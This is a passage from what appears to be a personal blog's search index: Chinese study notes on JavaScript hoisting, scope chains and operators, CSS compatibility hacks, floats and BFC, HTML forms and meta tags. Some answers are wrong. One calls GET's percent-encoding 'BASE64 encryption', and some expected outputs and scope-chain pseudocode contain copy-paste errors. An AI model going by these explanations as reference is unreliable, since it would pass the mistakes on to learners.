        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数声明和函数表达式]]></title>
    <url>%2Fblog%2F2017%2F09%2F22%2F%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E5%92%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[函数声明和函数表达式有什么区别函数声明和函数表达式都能够定义一个函数。函数声明是指使用function关键字定义一个函数，不必放在调用的前面。函数表达式则是将函数的指针赋值给声明变量，本质上是一个表达式，使用时必须放在调用的前面。 什么是变量的声明前置？什么是函数的声明前置形如以下的代码： 1var a = 10; 在编译时会被分成如下所示的代码 123var a; //（1）a = 10;//（2） 而所有的形如（1）的代码会被编译器搜索，先于其他非声明语句执行。 而函数声明的声明前置则是把任何以声明形式表达的函数定义提前到所有语句执行之前。 arguments 是什么arguments代表你调用时候传递的参数集合成为的一个类数组对象。 函数的”重载”怎样实现事实上，JS语言不存在普通高级编程语言的“重载”,后定义的函数会覆盖先前定义的函数，通过检查传入函数中参数的类型和数量并作出不同的反应，可以模仿方法的重载——《JS高级程序设计》第三版 P67 立即执行函数表达式是什么？有什么作用立即执行函数表达式（IIFE）通常是指将函数声明用小括号括起来，在其后加入立即执行运算符（即小括号），达到函数在声明之后立刻执行的目的。这种操作一般用于建立JS块级作用域。 求n!，用递归来实现1234function factorial(num)&#123; //此处应有范围检测 return num == 0 ? 1 : factorial(num-1)*num&#125; 以下代码输出什么？123456789101112131415161718192021222324252627282930313233function getInfo(name, age, sex)&#123; console.log('name:',name); console.log('age:', age); console.log('sex:', sex); //分别输出对应的参数 console.log(arguments); //输出参数集合对象 arguments[0] = 'valley'; //将参数集合对象的第1个值改为'valley'，因为arguments对象按引用传参，所以相当于name变量的值改为'valley' console.log('name', name);//输出name变量的值，这个时候一定是'valley'&#125; getInfo('饥人谷', 2, '男'); /* * name: "饥人谷" * age: 2 * sex: "男" * &#123;0:"饥人谷",1:2,2:"男",length:3,...&#125; * name: "valley" */ getInfo('小谷', 3); /* * name: "小谷" * age: 3 * sex: undefined * &#123;0:"饥人谷",1:2,length:2,...&#125; * name: "valley" */ getInfo('男'); /* * name: "男" * age: undefined * sex: undefined * &#123;0:"男",length:1,...&#125; * name: "valley" */ 写一个函数，返回参数的平方和？1234567891011function sumOfSquares()&#123; for(var i = 0,res = 0;i &lt; arguments.length;i++)&#123; res += arguments[i]*arguments[i]; &#125; return res;//这同时证明了js没有块级作用域&#125;var result = sumOfSquares(2,3,4)var result2 = sumOfSquares(1,3)console.log(result) //29console.log(result2) //10 如下代码的输出？为什么123console.log(a); //输出undefinedvar a = 1; //请参考 什么是变量的声明前置？ 一问console.log(b); //报错 未定义b 如下代码的输出？为什么12345678sayName('world'); //hello world 使用函数声明做出的声明前置sayAge(10); //undefined 函数表达式赋值不会被前置function sayName(name)&#123; console.log('hello ', name);&#125;var sayAge = function(age)&#123; console.log(age);&#125;; 如下代码输出什么? 写出作用域链查找过程伪代码1234567891011121314151617181920212223242526272829303132333435var x = 10bar() function foo() &#123; console.log(x)&#125;function bar()&#123; var x = 30 foo()&#125;/* 输出 10 ; globalContext = &#123; AO : &#123; x : 10, foo :function()&#123;&#125;, bar :function()&#123;&#125; &#125;, Scope : null &#125;; foo.[[Scope]] = globalContext.AO; bar.[[Scope]] = globalContext.AO; fooContext = &#123; AO : &#123;&#125;, Scope : foo.[[Scope]] //globalContext.AO &#125; barContext = &#123; AO : &#123; x : 30 &#125;, Scope : bar.[[Scope]] = globalContext.AO //globalContext.AO &#125;*/ 如下代码输出什么? 写出作用域链查找过程伪代码1234567891011121314151617181920212223242526272829303132333435var x = 10;bar() function bar()&#123; var x = 30; function foo()&#123; console.log(x) &#125; foo();&#125; /* 输出 “30” globalContext = &#123; AO : &#123; x : 10, bar :function()&#123;&#125; &#125;, Scope : null &#125;; bar.[[Scope]] = globalContext.AO; barContext = &#123; AO : &#123; x : 30, foo :function()&#123;&#125; &#125;, Scope : bar.[[Scope]] = globalContext.AO //globalContext.AO &#125; foo.[[Scope]] = barContext.AO; fooContext = &#123; AO : &#123;&#125;, Scope : foo.[[Scope]] //barContext.AO &#125;*/ 以下代码输出什么? 写出作用域链的查找过程伪代码12345678910111213141516171819202122232425262728293031323334var x = 10;bar() function bar()&#123; var x = 30; (function ()&#123; //暂且称作匿名函数A console.log(x) &#125;)()&#125;/* 输出 “30” globalContext = &#123; AO : &#123; x : 10, bar :function()&#123;&#125; &#125;, Scope : null &#125;; bar.[[Scope]] = globalContext.AO; barContext = &#123; AO : &#123; x : 30, 匿名函数A :function()&#123;&#125; &#125;, Scope : bar.[[Scope]] = globalContext.AO //globalContext.AO &#125; 匿名函数A.[[Scope]] = barContext.AO; 匿名函数AContext = &#123; AO : &#123;&#125;, Scope : foo.[[Scope]] //barContext.AO &#125;*/ 以下代码输出什么？ 写出作用域链查找过程伪代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758var a = 1;function fn()&#123; console.log(a) //undefined var a = 5 console.log(a) //5 a++ var a fn3() //200 fn2() //20 console.log(a) function fn2()&#123; console.log(a) a = 20 &#125;&#125;function fn3()&#123; console.log(a) a = 200&#125;fn()console.log(a) //1/* globalContext = &#123; AO : &#123; a : 5, fn2 :function()&#123;&#125;, &#125;, Scope : null &#125;; fn3.[[Scope]] = globalContext.AO; fn.[[Scope]] = globalContext.AO; fnContext = &#123; AO : &#123; x : 30, fn2 :function()&#123;&#125; &#125;, Scope : fn.[[Scope]] = globalContext.AO //globalContext.AO &#125; fn2.[[Scope]] = fnContext.AO; fn3Context = &#123; AO : &#123; a:200 &#125;, Scope : fn3.[[Scope]] //globalContext.AO &#125; fn2Context = &#123; AO : &#123; a:20 &#125;, Scope : fn2.[[Scope]] //fnContext.AO &#125;*/]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据类型运算符流程控制语句]]></title>
    <url>%2Fblog%2F2017%2F09%2F21%2F%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BF%90%E7%AE%97%E7%AC%A6%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[JavaScript 定义了几种数据类型? 哪些是原始类型?哪些是复杂类型?原始类型和复杂类型的区别是什么?Js定义了六种数据类型，分别是： 数值（number）：整数和小数（比如1和3.14） 字符串（string）：字符组成的文本（比如”Hello World”） 布尔值（boolean）：true（真）和false（假）两个特定值 undefined：表示“未定义”或不存在，即此处目前没有任何值 null：表示空缺，即此处应该有一个值，但目前为空 对象（object）：各种值组成的集合其中数值，字符串与布尔值一般被看作“原始类型”，而“对象”被看作复杂类型，null与undifined被看作特殊值。原始类型不能再细分，而对象往往被看作多个原始类型的集合。 typeof和instanceof的作用和区别?typeof运算符返回一个对象的类型，可能返回三种基本类型以及function，undefined，以及object，是一个一元运算符。instanceof是一个二元运算符，左边连接需要判断的变量，右边连接预期的类型，如果相符则返回true，不符则返回false。instanceof可以判断数组和对象。 如何判断一个变量是否是数字、字符串、布尔、函数JavaScript有三种方法，可以确定一个值到底是什么类型。 typeof运算符 instanceof运算符 Object.prototype.toString方法 前两种方法上题已经有介绍，第三种方法原理如下：Object.prototype.toString.call()获取对象的类名（对象类型），然后将[object、获取的类名、]组合并返回。可以看到一个结果为’[object Type]’的字符串。 NaN是什么? 有什么特别之处?NaN，是Not a Number的缩写，在IEEE浮点数算术标准（IEEE 754）中定义，表示一些特殊数值（无穷与非数值（NaN）），为许多CPU与浮点运算器所采用。特别之处在于NaN和任何值都不相等，包括自己。 如何把非数值转化为数值?三个函数可以把非数值转换为数值： Number() parseInt() parseFloat()其中后两个函数都从头开始解析字符串，若第一个字符就是非数字则返回NaN，否则一直解析到第一个非数字的字符为止。 ==与===有什么区别“==”包含了一个自动的隐式类型转换，规则如下： 如果一个是null，一个是undefined，那么相等 如果一个是数字，一个是字符串，先将字符串转为数字，然后比较 如果一个值是true/false则将其转为1/0比较 如果一个值是对象，一个是数字或字符串，则尝试使用valueOf和toString转换后比较 其它就不相等了而“===”则为严格相等，即类型与值必须全部相等。事实上正如《JS语言精粹》中所言，应尽量避免使用“==”。 break与continue有什么区别break为直接跳出循环，不再继续进行下一次循环。continue为跳出本次循环，直接开始进行下一次循环。 void 0 和 undefined在使用场景上有什么区别void 会执行后面的表达式并返回 undefined，通常 void 0 会用来获取 undefined。undefined 可能会被重写，但是 void 0 返回的值一定会是 undefined。 以下代码的输出结果是?为什么?1234console.log(1+1); //2，因为两个数字相加为2console.log("2"+"4"); //"24"，两个字符串中的加号为字符串连接运算符console.log(2+"4"); //"24"，数字被隐式类型转换为字符串console.log(+"4");//4，此时加号被认为是一个转换为数字的操作符 以下代码的输出结果是?123var a = 1; a+++a; typeof a+2; 输出结果为”number2”，第一句，定义数值类型变量a，第二句，a++为后自增运算符，现值为1，后加了自增的a，整行结果为3。第三行，typeof运算符优先级高于+，所以其结果为字符串”number”，之后的+被认为是字符串连接符，故数字2被隐式类型转换为字符串”2”，最终输出字符串”number2”。 以下代码的输出结果是? 为什么123var a = 1;var b = 3;console.log( a+++b ); 最终输出为数字4，a++被认为是后自增运算符优先计算，此行值不变为1，加值为3的变量b终值为4。 遍历数组，把数组里的打印数组每一项的平方12345 var arr = [3,4,5] for(var i = 0,len = arr.length;i &lt; len;i++)&#123; console.log(arr[i]*arr[i]);&#125; 遍历 JSON, 打印里面的值123456789var obj = &#123; name: 'hunger', sex: 'male', age: 28 &#125; for(key in obj)&#123; console.log(obj[key]);&#125;]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS相关概念]]></title>
    <url>%2Fblog%2F2017%2F09%2F20%2FJS%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[CSS和JS在网页中的放置顺序是怎样的？为了防止白屏与FOUC，CSS应放置于head标签内。为防止JS阻塞加载，JS应放置于body标签末尾。 解释白屏和FOUC白屏是webkit内核浏览器和某些情况下IE浏览器在将CSS放置于文档内容之后导致的现象，由于浏览器渲染时以CSS渲染HTML文档之后才会绘制图形，所以将CSS后置延后了CSS的加载，导致文档加载完成CSS尚未加载完成，此时文档尚未被绘制，会出现白屏状况。FOUC现象是Gecko内核浏览器和某些情况下IE浏览器将CSS放置于文档之后导致的现象，由于浏览器先绘制无样式的HTML文档再逐步加载样式，所以每加载一部分文档样式浏览器会将内容进行重绘，导致屏幕闪烁。两种现象的解决方式都是将CSS放置于文档之前加载。 async和defer的作用是什么？有什么区别async是指将脚本定义为异步加载并加载完立即执行。defer是指将脚本定义为异步加载，并等待文档全部加载完成后执行。两者都会使脚本异步加载，但执行时间不同。 简述网页的渲染机制 构建DOM树(DOM tree)：从上到下解析HTML文档生成DOM节点树（DOM tree），也叫内容树（content tree） 构建CSSOM(CSS Object Model)树：加载解析样式生成CSSOM树 执行JavaScript：加载并执行JavaScript代码（包括内联代码或外联JavaScript文件） 构建渲染树(render tree)：根据DOM树和CSSOM树,生成渲染树(render tree) 布局（layout）：根据渲染树将节点树的每一个节点布局在屏幕上的正确位置 绘制（painting）：遍历渲染树绘制所有节点，为每一个节点适用对应的样式，这一过程是通过UI后端模块完成]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器兼容]]></title>
    <url>%2Fblog%2F2017%2F09%2F14%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[什么是 CSS hackHack是针对不同的浏览器去写不同的CSS样式，从而让各浏览器能达到一致的渲染效果，那么针对不同的浏览器写不同的CSS CODE的过程，就叫CSS HACK，同时也叫写CSS Hack。 谈一谈浏览器兼容的思路 要不要做产品的角度（产品的受众、受众的浏览器比例、效果优先还是基本功能优先）成本的角度 (有无必要做某件事)做到什么程度让哪些浏览器支持哪些效果 如何做根据兼容需求选择技术框架/库(jquery)根据兼容需求选择兼容工具(html5shiv.js、respond.js、css reset、normalize.css、Modernizr)postCSS通过渐进增强或者优雅退化来实现浏览器兼容 列举5种以上浏览器兼容的写法 条件注释 1&lt;!--[if IE 7]&gt;&lt;link rel="stylesheet" href="ie7.css" type="text/css"/&gt;&lt;![endif]--&gt; css hack，这其中又分为3种表现形式法，分别如下：属性前缀法：ie6能识别下划线”_”和””，ie7能识别””，但是不能识别下划线。IE6~IE10都认识”\9”，但firefox前述三个都不能认识。 123456.box&#123; color: red; _color: blue; /*ie6*/ color: pink; /ie67*/ color: yellow\9; /*ie/edge 6-8*/&#125; 常见的属性兼容情况：inline-blcok:&gt;=ie8，min-width：&gt;=ie8，:before:after:&gt;=ie8 ,div:hover&gt;=ie8, background-size: &gt;=ie9,圆角：&gt;=ie9，阴影：&gt;=ie9，动画渐变：&gt;=ie10 选择器前缀法 IE条件注释法结合选择器整体优化 利用normalize.css,统一所有浏览器样式 以下工具/名词是做什么的 条件注释条件注释是一种安全的区分IE浏览器版本的语法，通过形如 1234&lt;!--[if IE]&gt;用于 IE &lt;![endif]--&gt;&lt;!--[if IE 6]&gt;用于 IE6 &lt;![endif]--&gt;&lt;!--[if IE 7]&gt;用于 IE7 &lt;![endif]--&gt;&lt;!--[if IE 8]&gt;用于 IE8 &lt;![endif]--&gt; 的代码来区分IE版本。 IE Hack针对IE浏览器使用独有的CSS语法来实现兼容的手段称作IE Hack。 js 能力检测利用js检测浏览器是否支持某种能力的手段。 html5shiv.jshtml5shiv.js是一个js库，用于解决IE9以下版本浏览器对HTML5新增标签不识别，并导致CSS不起作用的问题。 respond.jsRespond.js 是一个快速、轻量的 polyfill，用于为 IE6-8 以及其它不支持 CSS3 Media Queries 的浏览器提供媒体查询的 min-width 和 max-width 特性，实现响应式网页设计（Responsive Web Design）。 css reset先定义好一些CSS样式，来让所有浏览器都按照同样的规则解释CSS。 normalize.css先定义好一些CSS样式的同时保护有用的原生CSS样式，来让所有浏览器都按照同样的规则解释CSS。 ModernizrModernizr 是一个用来检测浏览器功能支持情况的 JavaScript 库。通过这个库我们可以检测不同的浏览器对于HTML5特性的支持情况。并以类标识的方式添加到标签中。 postCSSPostCSS是一个使用JavaScript插件来转换CSS的工具。能够达到兼容各种不同浏览器的效果，同时拥有很多插件。 一般在哪个网站查询属性兼容性？caniuse]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浮动定位BFC边距合并]]></title>
    <url>%2Fblog%2F2017%2F09%2F11%2F%E6%B5%AE%E5%8A%A8%E5%AE%9A%E4%BD%8DBFC%E8%BE%B9%E8%B7%9D%E5%90%88%E5%B9%B6%2F</url>
    <content type="text"><![CDATA[浮动元素有什么特征？对父容器、其他浮动元素、普通元素、文字分别有什么影响?特征：浮动元素会脱离正常的文档流，按照其外边距指定的位置相对于它的上一个块级元素（或父元素）显示浮动元素后面的块级元素的内容会向此浮动元素的外边距靠齐，但是边框和背景却忽略浮动元素而向上一个任意非浮动元素靠齐浮动元素后面的内联元素会向此浮动元素的外边距靠齐 float造成的影响：对其父元素的影响对于其父元素来说，元素浮动之后，它脱离当前正常的文档流，所以它也无法撑开其父元素，造成父元素的塌陷 对其兄弟元素（非浮动）的影响如果兄弟元素为块级元素，该元素会忽视浮动元素的而占据它的位置，并且元素会处在浮动元素的下层（并且无法通过z-index属性改变他们的层叠位置），但它的内部文字和其他行内元素都会环绕浮动元素。如果如果兄弟元素为内联元素，则元素会环绕浮动元素排列。 对其兄弟元素（浮动）的影响同一个方向的浮动元素：当一个浮动元素在浮动过程中碰到同一个方向的浮动元素时，它会紧跟在它们后面反方向的浮动元素：互不影响，位于同一条水平线上，当空间不够时会被挤下 对子元素的影响当一个元素浮动时，在没有清除浮动的情况下，它无法撑开其父元素，但它可以让自己的浮动子元素撑开它自身，并且在没有定义具体宽度情况下，使自身的宽度从100%变为自适应（浮动元素display:block）。其高度和宽度均为浮动元素高度和非浮动元素高度之间的最大值 清除浮动指什么? 如何清除浮动? 两种以上方法浮动会导致：（1）背景不能显示 （2）边框不能撑开 （3）margin 设置值不能正确显示清除浮动就是消除这些不良影响清除浮动可以通过设置父级元素overflow:auto;或者display:inline-block;等方法来实现。 有几种定位方式，分别是如何实现定位的，参考点是什么，使用场景是什么？absolute生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。元素的位置通过 “left”, “top”, “right” 以及 “bottom” 属性进行规定。fixed生成绝对定位的元素，相对于浏览器窗口进行定位。元素的位置通过 “left”, “top”, “right” 以及 “bottom” 属性进行规定。relative生成相对定位的元素，相对于其正常位置进行定位。因此，”left:20” 会向元素的 LEFT 位置添加 20 像素。static默认值。没有定位，元素出现在正常的流中（忽略 top, bottom, left, right 或者 z-index 声明）。 z-index 有什么作用? 如何使用?相当于photoshop中“图层”的概念，上面的图层覆盖下面的图层，此属性的数值越大相当于图层越上。 position:relative和负margin都可以使元素位置发生偏移?二者有什么区别position：relative可以使元素发生偏移，但是在文档流中，它仍然占据着原来的位置，所以其他同级元素的位置不会发生变化。负margin：通过负margin进行偏移的元素，它会放弃偏移前占据的空间，所以其他同级元素的位置发生了变化。 BFC 是什么？如何生成 BFC？BFC 有什么作用？举例说明BFC：块级格式化上下文，它是指一个独立的块级渲染区域，只有Block-level BOX参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。 CSS2.1中规定满足下列CSS声明之一的元素便会生成BFC。 根元素 float的值不为none overflow的值不为visible display的值为inline-block、table-cell、table-caption position的值为absolute或fixed 不和浮动元素重叠 如果一个浮动元素后面跟着一个非浮动的元素，那么就会产生一个覆盖的现象，很多自适应的两栏布局就是这么做的。 清除元素内部浮动 只要把父元素设为BFC就可以清理子元素的浮动了，最常见的用法就是在父元素上设置overflow: hidden样式，对于IE6加上zoom:1就可以了(IE Haslayout)。 嵌套元素Margin边距折叠问题的解决 按照BFC的定义，只有同属于一个BFC时，两个元素才有可能发生垂直Margin的重叠，这个包括相邻元素，嵌套元素，只要他们之间没有阻挡(例如没有边框，非空内容，padding等)就会发生margin重叠。 因此要解决margin重叠问题，只要让它们不在同一个BFC就行了，只要把父元素设为BFC就可以了。这样子元素的margin就不会和父元素的margin发生重叠了。 在什么场景下会出现外边距合并？如何合并？如何不让相邻元素外边距合并？给个父子外边距合并的范例同一BFC下会产生外边距合并；合并存在两种情况，分别是内外嵌套元素的外边距合并和元素的上下外边距合并；合并规则：margin都为正值，取较大值。margin都为是负值，取较小值。margin有正有负，先取出负margin中较小的，然后和正margin最大值相加。所有相邻的margin一起参与运算，不能分部分进行。使两个元素处于不同BFC或者在内外嵌套情况时，在外元素加border或者padding即可。 举例：12345678910&lt;div style="margin: 20px;"&gt; &lt;div style="margin: 20px;"&gt;222&lt;/div&gt;&lt;/div&gt;&lt;!-- 内外嵌套边距合并的情况 --&gt;&lt;div style="margin: 20px"&gt;&lt;/div&gt;&lt;div style="margin: 20px"&gt;&lt;/div&gt;&lt;!-- 上下外边距合并的情况 --&gt; 作业作业代码]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Form表单]]></title>
    <url>%2Fblog%2F2017%2F09%2F10%2FForm%E8%A1%A8%E5%8D%95%2F</url>
    <content type="text"><![CDATA[form表单有什么作用？有哪些常用的input 标签，分别有什么作用？form表单的作用传送用户填写的数据到服务器 常用的input 标签 input标签type属性 作用 text 文本输入框 password 密码输入框 radio 单选输入框 checkbox 多选输入框 submit 提交按钮 button 按钮 hidden 隐藏数据 post 和 get 方式的区别？ GET提交，请求的数据会附在URL之后(就是把数据放置在HTTP协议头中)，以?分割URL和传输数据，多个参数用&amp;连接。如果数据是英文字母数字，原样发送，如果是空格，转换为+，如果是中文其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中%XX中的XX为该符号以16进制表示的ASCII。 POST提交：把提交的数据放置在是HTTP包的包体中。 因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变。 传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。 而在实际开发中存在的限制主要有： GET:特定浏览器和服务器对URL长度有限制，例如IE对URL长度的限制是2083字节(2K+35。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系统的支持。 因此对于GET提交时，传输数据就会受到URL长度的限制。 POST:由于不是通过URL传值，理论上数据不受限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。 在input里，name 有什么作用？作为可与服务器交互数据的HTML元素的服务器端的标示，在某些特殊标签如radio里可作为分组依据。 radio 如何 分组?通过标签中的name属性进行分组。 placeholder 属性有什么作用?可以在文本输入框内显示默认的提示字符。 type=hidden隐藏域有什么作用? 举例说明 隐藏数据一起发送给服务器。 作为Localstrange的替代品。 当有多个submit按钮时，可以用于确认是哪个按钮提交的表单。 可以用于联系多个表单。 作为全局变量使用。 作为父窗口的隐藏域，对小窗口传参。 作业 姓名： 密码： 性别： 男女 取向： 男女 爱好： Dota旅游宠物 评论： 我的car： 奔驰 宝马]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML知识点总结]]></title>
    <url>%2Fblog%2F2017%2F09%2F10%2FHTML%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[HTML、XML、XHTML 有什么区别HTML、XML和XHTML都是标准通用标记语言的一个子集。HTML被设计用来显示数据，其焦点是数据的外观；XML被设计用来传输和存储数据，其焦点是数据的内容；XHTML是更严格更纯净的 HTML 版本，是作为一种 XML 应用被重新定义的 HTML，设计的目的是为了取代HTML以适应未来网络更多的需求。它们都可以用来开发网页，但就目前来看，网页开发中HTML还是占绝对的主流，现在最新版本HTML5也备受推崇。可拓展标记语言XML广泛运用于各种应用程序中数据的存储（例如各种配置文件）和应用程序间的数据传输，可以说是一项必须掌握的技术。至于可扩展超文本标记语言XHTML，在2009年W3C已经宣布停止了对XHTML2的开发，转而大力支持HTML5。 怎样理解 HTML 语义化语义化的HTML就是写出的HTML代码，符合内容的结构化（内容语义化），选择合适的标签（代码语义化），能够便于开发者阅读和写出更优雅的代码的同时让浏览器的爬虫和机器很好地解析。语义化有助于： 有利于SEO，有利于搜索引擎爬虫更好的理解我们的网页，从而获取更多的有效信息，提升网页的权重。 在没有CSS的时候能够清晰的看出网页的结构，增强可读性。 便于团队开发和维护，语义化的HTML可以让开发者更容易的看明白，从而提高团队的效率和协调能力。 支持多终端设备的浏览器渲染。 怎样理解内容与样式分离的原则内容和样式不分离就是利用HTML标签和浏览器的默认样式来尝试控制显示出的内容模样，事实上大多数浏览器的默认样式都不相同，这样做也不利于统一修改样式。内容和样式分离就是将文档的语义化内容用HTML表示，展示的模样用CSS表示，这样做既可以统一样式，又可以方便修改。 有哪些常见的meta标签1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!-- 关键字，搜所引擎 SEO --&gt;&lt;meta http-equiv="keywords" content="关键字1,关键字2,..."&gt; &lt;!-- 页面描述 --&gt;&lt;meta http-equiv="description" content="网页描述"&gt; &lt;!-- content的取值为webkit,ie-comp,ie-stand之一，区分大小写，分别代表用webkit内核，IE兼容内核，IE标准内核。 --&gt;&lt;meta name="renderer" content="webkit|ie-comp|ie-stand"&gt;&lt;!-- 若页面需默认用极速核，增加标签： --&gt;&lt;meta name="renderer" content="webkit"&gt;&lt;!-- 若页面需默认用ie兼容内核，增加标签： --&gt;&lt;meta name="renderer" content="ie-comp"&gt;&lt;!-- 若页面需默认用ie标准内核，增加标签： --&gt;&lt;meta name="renderer" content="ie-stand"&gt;&lt;!-- 如果安装了GCF，则使用GCF来渲染页面，如果没有安装GCF，则使用最高版本的IE内核进行渲染。X-UA-Compatible：这是个是IE8的专用标记,用来指定IE8浏览器去模拟某个特定版本的IE浏览器的渲染方式(比如人见人烦的IE6)，以此来解决部分兼容问题。 --&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" &gt;&lt;!-- 强制页面在当前窗口以独立页面显示。 --&gt;&lt;meta http-equiv="Window-target" content="_top"&gt;&lt;!-- 自动刷新，并指向新的页面 --&gt;&lt;meta http-equiv="Refresh" content="2；URL=http://"&gt;&lt;!-- 禁止浏览器缓存 --&gt;&lt;!-- 是用于设定禁止浏览器从本地机的缓存中调阅页面内容，设定后一旦离开网页就无法从Cache中再调出用法： --&gt;&lt;meta http-equiv="pragram" content="no-cache"&gt; &lt;!-- 清除缓存（再访问这个网站要重新下载！） --&gt;&lt;meta http-equiv="cache-control" content="no-cache, must-revalidate"&gt; &lt;!-- 设定网页的到期时间 --&gt;&lt;meta http-equiv="expires" content="0"&gt; &lt;!-- 手机端 --&gt;&lt;meta name="format-detection" content="telphone=no, email=no"/&gt;&lt;!-- 忽略页面中的数字识别为电话，忽略email识别 --&gt;&lt;meta name="apple-mobile-web-app-status-bar-style" content="black"/&gt;&lt;!-- 设置苹果工具栏颜色 --&gt;&lt;!-- 不让百度转码 --&gt;&lt;meta http-equiv="Cache-Control" content="no-siteapp" /&gt;&lt;!-- 不缓存 --&gt;&lt;meta http-equiv="cache-control" content="no-cache" /&gt;&lt;!-- 初始化设备 --&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, minimal-ui" /&gt;&lt;!-- 网站开启对iphone私有 web app 程序的支持 --&gt;&lt;meta content="yes" name="apple-mobile-web-app-capable" /&gt;&lt;!-- 改变顶部状态条的颜色 iphone私有的属性--&gt;&lt;meta content="black" name="apple-mobile-web-app-status-bar-style" /&gt; 文档声明的作用?严格模式和混杂模式指什么?&lt;!doctype html&gt; 的作用?文档声明的作用文档声明指出阅读程序应该用什么规则集来解释文档中的标记。在web文档的情况下，“阅读程序”通常是浏览器或者校验器这样的一个程序，“规则”则是w3c所发布的一个文档类型定义（dtd）中包含的规则。每个dtd都包括一系列标记、attributes和properties，它们用于标记web文档的内容；此外还包括一些规则，它们规定了哪些标记能出现在其他哪些标记中。每个web建议标准（比如html 4 frameset和xhtml 1.0 transitional）都有自己的dtd。假如文档中的标记不遵循doctype声明所指定的dtd，这个文档除了不能通过代码校验之外，还有可能无法在浏览器中正确显示。对于标记不一致的问题，浏览器相较于校验器来说更宽容。但是，不正确的doctype声明经常导致网页不正确显示，或者导致它们根本不能显示。 严格模式和混杂模式指什么严格模式：又称标准模式，是指浏览器按照 W3C 标准解析代码。 混杂模式：又称怪异模式或兼容模式，是指浏览器用自己的方式解析代码。 如何区分：浏览器解析时到底使用严格模式还是混杂模式，与网页中的 DTD 直接相关。 如果文档包含严格的 DOCTYPE ，那么它一般以严格模式呈现。（严格 DTD ——严格模式）包含过渡 DTD 和 URI 的 DOCTYPE ，也以严格模式呈现，但有过渡 DTD 而没有 URI （统一资源标识符，就是声明最后的地址）会导致页面以混杂模式呈现。（有 URI 的过渡 DTD ——严格模式；没有 URI 的过渡 DTD ——混杂模式）DOCTYPE 不存在或形式不正确会导致文档以混杂模式呈现。（DTD不存在或者格式不正确——混杂模式）HTML5 没有 DTD ，因此也就没有严格模式与混杂模式的区别，HTML5 有相对宽松的语法，实现时，已经尽可能大的实现了向后兼容。（ HTML5 没有严格和混杂之分）意义：严格模式与混杂模式存在的意义与其来源密切相关，如果说只存在严格模式，那么许多旧网站必然受到影响，如果只存在混杂模式，那么会回到当时浏览器大战时的混乱，每个浏览器都有自己的解析模式。 !doctype html 的作用声明文档的解析类型(document.compatMode)，避免浏览器的怪异模式。 document.compatMode：BackCompat：怪异模式，浏览器使用自己的怪异模式解析渲染页面。CSS1Compat：标准模式，浏览器使用W3C的标准解析渲染页面。 这个属性会被浏览器识别并使用，但是如果你的页面没有DOCTYPE的声明，那么compatMode默认就是BackCompat,这也就是绝望和黑暗的开始 – 浏览器按照自己的方式解析渲染页面，那么，在不同的浏览器就会显示不同的样式。如果你的页面添加了&lt;!DOCTYPE html&gt;那么，那么就等同于开启了标准模式，那么浏览器就得老老实实的按照W3C的标准解析渲染页面，这样一来，你的页面在所有的浏览器里显示的就都是一个样子了。这就是&lt;!DOCTYPE html&gt;的作用。 浏览器乱码的原因是什么？如何解决造成html网页乱码原因主要是html源代码内中文字内容与html编码不同造成。但无论是哪种情况造成乱码解决方法都是在网页开始时候设置网页编码。 常见的浏览器有哪些，什么内核浏览器市场占有率内核Chrome58.64%WebKit/Chromium引擎Internet Explorer18.95%TridentFirefox11.79%GeckoEdge5.61%TridentSafari3.37%WebKitOpera1.18%Presto 市场占有率数据为2017年4月世界内统计 数据来源于NetMarketShare 列出常见的标签，并简单介绍这些标签用在什么场景 标签 场景 head 页面头部，放置脚本，样式，设置等 body 页面内容 h1~h6 标题 p 段落标签 br/ 换行 div 分块用标签 ul 无序列表 ol 有序列表 form 表单 img 设置一个图像 a 超链接]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
</search>
